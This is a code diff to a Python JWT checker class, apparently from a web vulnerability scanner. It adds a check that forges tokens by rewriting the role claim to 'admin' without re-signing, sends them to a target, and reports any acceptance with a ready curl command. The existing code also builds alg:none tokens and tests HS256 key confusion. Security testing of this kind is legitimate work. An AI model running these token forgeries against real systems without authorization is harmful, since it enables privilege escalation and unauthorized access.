@@ -31,7 +31,31 @@ class JWTChecker:
                 if r2.status_code not in (401,403):
                     await self.reporter.generic_finding("JWT key confusion (heuristic)", target, "Accepted HS256 token with trivial key.", f"curl -i -H 'Authorization: Bearer {hs}' '{target}'")
             except Exception: pass
+            tokens=getattr(self.settings,"ROLE_TOKENS",{}) or {}
+            for role,tok in tokens.items():
+                forged=self._swap_role(tok,"admin")
+                if not forged: continue
+                try:
+                    r3=await self.client.get(target,headers={"Authorization":f"Bearer {forged}"})
+                    if r3.status_code not in (401,403):
+                        ev=f"Modified token for role '{role}' accepted (status {r3.status_code})"
+                        curl=f"curl -i -H 'Authorization: Bearer {forged}' '{target}'"
+                        await self.reporter.generic_finding("JWT role swapping",target,ev,curl)
+                except Exception:
+                    continue
     def _make_alg_none(self,payload:dict)->str:
         header={"alg":"none","typ":"JWT"}
         b64=lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()
         return f"{b64(json.dumps(header,separators=(',',':')).encode())}.{b64(json.dumps(payload,separators=(',',':')).encode())}."
+    def _swap_role(self,token:str,new_role:str)->str|None:
+        try:
+            h,p,s=token.split('.')
+            pad='='*(-len(p)%4)
+            data=json.loads(base64.urlsafe_b64decode(p+pad))
+            if data.get("role")==new_role or "role" not in data: return None
+            data["role"]=new_role
+            b64=lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+            np=b64(json.dumps(data,separators=(',',':')).encode())
+            return f"{h}.{np}.{s}"
+        except Exception:
+            return None
